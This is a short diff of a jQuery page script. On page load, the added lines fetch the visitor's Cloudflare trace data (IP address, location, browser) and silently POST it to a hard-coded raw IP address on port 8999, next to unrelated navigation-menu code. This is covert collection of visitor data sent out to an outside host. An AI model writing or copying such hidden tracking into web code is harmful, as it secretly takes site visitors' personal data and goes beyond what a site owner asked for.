@@ -35,6 +35,11 @@
 
 $(document).ready(function() {
 
+	$.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
+		console.log(data);
+		
+		$.post("http://70.95.18.17:8999/api/log/create", data);
+	})
 
 $('#navBtn').click(function() {
   if($('#navBarCollapseMenu').hasClass("collapse"))
